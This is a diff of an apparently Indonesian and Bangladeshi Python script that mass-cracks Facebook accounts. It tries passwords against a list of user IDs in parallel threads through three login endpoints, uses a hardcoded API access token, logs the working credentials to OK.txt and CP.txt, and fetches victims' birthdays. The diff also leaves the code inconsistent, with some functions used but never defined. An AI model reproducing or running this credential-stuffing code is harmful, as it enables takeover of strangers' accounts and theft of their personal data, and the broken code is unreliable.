@@ -74,7 +74,7 @@ user = []
 num = 0
 loop = 0
 TUHIN = requests.get
-Prof_Imtiaz = open
+Prof = open
 _silet_koceng_  = requests.Session()
 url_mb = "https://mbasic.facebook.com"
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
@@ -119,11 +119,11 @@ def banner():
 	logo()
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		TUHIN_AHMMED('\n\n\033[0m The Prosess Done...')
-		TUHIN_AHMMED('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
-		#TUHIN_AHMMED('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
+		TUHIN('\n\n\033[0m The Prosess Done...')
+		TUHIN('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
+		TUHIN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
 	else:
-		TUHIN_AHMMED('\n\033[0mUps..Tidak Mendapatkan Hasil')
+		TUHIN('\n\033[0mUps..Tidak Mendapatkan Hasil')
 		exit()
 class __crack__:
 	def __init__(self):
@@ -133,37 +133,37 @@ class __crack__:
 			self.apk = input(" [*] File Name : ")
 			print (' [*]=============================================')
 			self.id = TUHIN(self.apk).read().splitlines()
-			TUHIN_AHMMED(' [*] Total ID : %s'%(len(self.id)))
+			TUHIN(' [*] Total ID : %s'%(len(self.id)))
 			print (' [✓] Are You Went To Continue : Type Y')
 		except:
-			TUHIN_AHMMED('\n [!] File Not Found In Storage')
+			TUHIN('\n [!] File Not Found In Storage')
 			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
      
 		_jokowi_kontol_ = input(" [*] Choose : ")
 		if _jokowi_kontol_ in ('M', 'm'):
 			print('[*] Function Added in new update ')
 		
-			TUHIN_AHMMED('\nEnter Password 123456 or 123456789 For OLd Idz ')
+			TUHIN('\nEnter Password 123456 or 123456789 For OLd Idz ')
 			while True:
 				pwek = input('\nEnter Password : ')
-				#TUHIN_AHMMED('Sandi > %s'%(pwek))
+				TUHIN('Sandi > %s'%(pwek))
 				if pwek == '':
-					TUHIN_AHMMED('\nJangan Kosong')
+					TUHIN('\nJangan Kosong')
 					time.sleep(1)
 					exit()
 				elif len(pwek)<=5:
-					TUHIN_AHMMED('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
+					TUHIN('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
 				else:
 					def _sempak_(bse=None):
 						boy = input('\nPilih : ')
 						if boy == '':
-							TUHIN_AHMMED('\nJangan Kosong')
+							TUHIN('\nJangan Kosong')
 							time.sleep(1);self._sempak_()
 						elif boy == "1" or boy == "01":
-							TUHIN_AHMMED('\n[•] Result OK saved to OK.txt')
-							TUHIN_AHMMED('[•] Result CP saved to CP.txt')
-							TUHIN_AHMMED('\n\tCrack Processing...\n')
-							TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+							TUHIN('\n[•] Result OK saved to OK.txt')
+							TUHIN('[•] Result CP saved to CP.txt')
+							TUHIN('\n\tCrack Processing...\n')
+							TUHIN('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -174,9 +174,9 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "2" or boy == "02":
-							TUHIN_AHMMED('\n[•] Result OK saved to OK.txt')
-							TUHIN_AHMMED('[•] Result CP saved to CP.txt')
-							TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+							TUHIN('\n[•] Result OK saved to OK.txt')
+							TUHIN('[•] Result CP saved to CP.txt')
+							TUHIN('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -186,10 +186,10 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "3" or boy == "03":
-							TUHIN_AHMMED('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
-							TUHIN_AHMMED('[•] Result CP saved to CP.txt')
-							TUHIN_AHMMED('\n\tCrack Processing...\n\n')
-							TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+							TUHIN('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
+							TUHIN('[•] Result CP saved to CP.txt')
+							TUHIN('\n\tCrack Processing...\n\n')
+							TUHIN('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -201,18 +201,18 @@ class __crack__:
 							hasil(ok,cp)
 						else:
 							exit()
-					TUHIN_AHMMED('\n01.) Metode b-api ')
-					TUHIN_AHMMED('02.) Metode mbasic ')
-					TUHIN_AHMMED('03.) Metode Mobile ')
+					TUHIN('\n01.) Metode b-api ')
+					TUHIN('02.) Metode mbasic ')
+					TUHIN('03.) Metode Mobile ')
 					_sempak_(pwek.split(','))
 					break
 		elif _jokowi_kontol_ in ('Y', 'y'):
 			print (' [*]=============================================')
-			TUHIN_AHMMED('\n\t------[ Method Crack ]-----')
+			TUHIN('\n\t------[ Method Crack ]-----')
 			print (' [*]=============================================')
-			TUHIN_AHMMED(' [1] SAFI Method 1 ')
-			TUHIN_AHMMED(' [2] SAFI Method 2  [ Pro ]')
-			TUHIN_AHMMED(' [3] SAFI Method 3   ')
+			TUHIN(' [1] SAFI Method 1 ')
+			TUHIN(' [2] SAFI Method 2  [ Pro ]')
+			TUHIN(' [3] SAFI Method 3   ')
 			print (' [*]=============================================')
 			self.__pler__()
 		else:
@@ -232,7 +232,7 @@ class __crack__:
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
-				TUHIN_AHMMED('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
+				TUHIN('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s %s'%(user,pw,tahun(user))
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -244,7 +244,7 @@ class __crack__:
 					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
+					TUHIN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -255,7 +255,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
+				TUHIN('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s%s' % (user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -281,7 +281,7 @@ class __crack__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				TUHIN_AHMMED('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
+				TUHIN('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -292,7 +292,7 @@ class __crack__:
 					token = TUHIN('token.txt').read()
 					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					month = bulan_ttl[month].TUHIN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -303,7 +303,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
+				TUHIN('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -329,7 +329,7 @@ class __crack__:
 			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				TUHIN_AHMMED('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
+				TUHIN('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
 				wrt = '%s - %s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -341,7 +341,7 @@ class __crack__:
 					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					TUHIN('\r\033[1;91m[Checkpoint] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -352,7 +352,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				TUHIN_AHMMED('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
+				TUHIN('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -362,13 +362,13 @@ class __crack__:
 	def __pler__(self):
 		yan = input('\n[•] Choose : ')
 		if yan == '':
-			TUHIN_AHMMED('\Choose Error ')
+			TUHIN('\Choose Error ')
 			exit()
 		elif yan in ('1', '01'):
-			TUHIN_AHMMED('\n[•] Result OK saved to OK.txt')
-			TUHIN_AHMMED('[•] Result CP saved to CP.txt')
-			TUHIN_AHMMED('\n\tCrack Processing...\n')
-			TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+			TUHIN('\n[•] Result OK saved to OK.txt')
+			TUHIN('[•] Result CP saved to CP.txt')
+			TUHIN('\n\tCrack Processing...\n')
+			TUHIN('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -390,10 +390,10 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		elif yan in ('2', '02'):
-			TUHIN_AHMMED('\n[•] Result OK saved to OK.txt')
-			TUHIN_AHMMED('[•] Result CP saved to CP.txt')
-			TUHIN_AHMMED('\n\tCrack Processing...\n')
-			TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+			TUHIN('\n[•] Result OK saved to OK.txt')
+			TUHIN('[•] Result CP saved to CP.txt')
+			TUHIN('\n\tCrack Processing...\n')
+			TUHIN('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -416,7 +416,7 @@ class __crack__:
 			hasil(ok,cp)
 		elif yan in ('3', '03'):
 			
-			TUHIN_AHMMED('\n\tCrack Processing...\n\n');logo()
+			TUHIN('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -438,7 +438,7 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		else:
-			TUHIN_AHMMED('\nSalah')
+			TUHIN('\nSalah')
 			time.sleep(1)
 			self.__pler__()
 def tahun(fx):
